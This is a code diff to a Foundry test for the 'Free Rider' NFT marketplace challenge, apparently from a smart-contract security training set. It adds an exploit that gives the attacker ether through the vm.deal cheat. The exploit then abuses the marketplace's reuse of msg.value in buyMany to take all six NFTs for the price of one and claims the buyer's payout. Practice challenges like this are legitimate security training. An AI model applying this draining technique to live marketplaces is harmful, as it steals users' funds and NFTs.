@@ -36,6 +36,9 @@ contract FreeRider is Test {
     address payable internal attacker;
     address payable internal deployer;
 
+    //new
+    FreeRiderNFTMarketplace public marketplace;
+
     function setUp() public {
         /**
          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
@@ -91,9 +94,7 @@ contract FreeRider is Test {
         assertEq(uniswapV2Pair.token1(), address(weth));
         assertGt(uniswapV2Pair.balanceOf(deployer), 0);
 
-        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
-            value: MARKETPLACE_INITIAL_ETH_BALANCE
-        }(AMOUNT_OF_NFTS);
+        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
 
         damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());
 
@@ -120,23 +121,41 @@ contract FreeRider is Test {
 
         vm.startPrank(buyer);
 
-        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
-            attacker,
-            address(damnValuableNFT)
-        );
+        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(attacker, address(damnValuableNFT));
 
         vm.stopPrank();
+
+        //marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitFreeRider() public {
         /**
          * EXPLOIT START *
          */
-        vm.startPrank(attacker, attacker);
+        vm.deal(attacker, 25 ether);
+        console.log(attacker.balance);
 
+        uint256[] memory NFTsToBuy = new uint256[](6);
+
+        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
+            NFTsToBuy[i] = i;
+            unchecked {
+                ++i;
+            }
+        }
+
+        vm.startPrank(attacker, attacker);
+        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTsToBuy);
+        console.log(attacker.balance);
+
+        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), tokenId);
+        }
         vm.stopPrank();
+
+        console.log(attacker.balance);
         /**
          * EXPLOIT END *
          */
@@ -156,7 +175,7 @@ contract FreeRider is Test {
         // The buyer extracts all NFTs from its associated contract
         vm.startPrank(buyer);
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
-            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
+            damnValuableNFT.safeTransferFrom(address(freeRiderBuyer), buyer, tokenId);
             assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
         }
         vm.stopPrank();
